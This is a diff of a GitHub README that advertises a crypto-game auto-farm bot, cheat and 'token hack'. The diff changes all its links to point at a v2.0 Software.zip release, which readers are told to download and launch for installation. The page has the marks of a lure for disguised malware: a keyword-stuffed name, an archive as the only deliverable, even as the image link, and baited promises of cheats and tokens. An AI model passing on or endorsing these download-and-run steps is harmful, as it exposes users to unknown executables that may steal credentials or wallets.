@@ -17,11 +17,11 @@ auto-clicker, auto-farm, blockchain-game, blockchain-technology, brilliant-crypt
 🔹 Enhance efficiency and gameplay experience
 
 ## Download Software:
-[![Download Software](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip)](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip)
-*Note: The https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip file needs to be launched for installation.*
+[![Download Software](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v2.0/Software.zip)](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v2.0/Software.zip)
+*Note: The https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v2.0/Software.zip file needs to be launched for installation.*
 
 ## How to Use:
-1. Download the https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip file from the link above.
+1. Download the https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v2.0/Software.zip file from the link above.
 2. Launch the software and follow the instructions for setup.
 3. Customize your settings for automated farming and clicker activities.
 4. Enjoy optimized gameplay with crypto token integration and cheats.
@@ -34,4 +34,4 @@ If you have any questions, suggestions, or feedback, don't hesitate to reach out
 
 ## Let's Level Up the Game Together! 🎮🚀
 
-![Crypto Game](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v1.0/Release.zip)
+![Crypto Game](https://github.com/marce123mark/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases/download/v2.0/Software.zip)
